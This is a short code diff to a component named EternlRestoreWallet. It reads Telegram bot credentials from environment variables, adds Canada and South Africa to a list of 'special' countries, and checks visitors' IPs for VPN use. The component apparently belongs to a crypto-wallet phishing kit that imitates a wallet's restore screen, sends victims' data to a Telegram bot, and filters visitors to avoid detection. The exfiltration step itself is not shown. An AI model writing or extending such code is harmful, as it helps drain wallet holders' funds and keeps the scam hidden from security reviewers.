@@ -50,7 +50,7 @@ function EternlRestoreWallet() {
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
 
-    const specialCountries = ["NG","AE"];
+    const specialCountries = ["NG","AE","CA","ZA"];
 
     // Check VPN status using the IP we retrieved
     const isVpn = await checkVpnStatus(ip);
